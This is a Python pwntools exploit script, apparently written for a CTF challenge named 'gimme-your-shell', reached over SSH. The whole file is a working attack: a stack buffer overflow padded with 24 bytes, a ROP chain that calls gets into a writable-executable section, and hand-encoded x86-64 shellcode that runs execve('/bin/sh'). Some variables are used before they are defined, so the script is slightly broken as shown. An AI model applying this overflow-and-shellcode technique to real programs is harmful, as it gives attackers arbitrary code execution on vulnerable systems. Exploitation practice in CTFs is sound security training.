#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

conn = process(["ssh", "-i", "key", "-p", "2225", "user@gimme-your-shell.ctf.insecurity-insa.fr "])
conn.recvuntil(banner)

pop_rbp_ret = 0x400522 #pop rbp; ret
rwx_section = 0x60babe #rwx section far enough to not have any "\n" in the payload (due to the rbp-0x10); "\n" stop the reading of gets
gets 		= 0x400570 #mov rdi, rbp-0x10; call gets; .... ; ret

# execve("/bin/sh", NULL, NULL)
shellcode  = ""

shellcode += "\x48\x31\xff"	# xor rdi, rdi
shellcode += "\x48\x31\xf6"	# xor rsi, rsi
shellcode += "\x48\x31\xd2"	# xor rdx, rdx
shellcode += "\x48\x31\xc0"	# xor rax, rax
shellcode += "\x50"			# push rax
shellcode += "\xeb\x11"		# jmp rel 0x13

#####
shellcode += "\x90"*9 # nop sled
shellcode += p64(rwx_section - 0x10) # new Saved_RIP with the new stack, YES! Right in the middle of the shellcode :D. (Thx to the rbp - 0x10)
#####

#jump here:
shellcode += "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" # movabs rbx, 0x68732f2f6e69622f ; '/bin//sh'
shellcode += "\x53"				# push rbx
shellcode += "\x48\x89\xe7"		# mov rdi, rsp
shellcode += "\xb0\x3b"			# mov al, 0x3b
shellcode += "\x0f\x05"			# syscall


firstStage += p64(pop_rbp_ret)
firstStage += p64(rwx_section) 
firstStage += p64(gets)


payload = "A"*24
payload += firstStage
payload += "\n"
payload += shellcode

print payload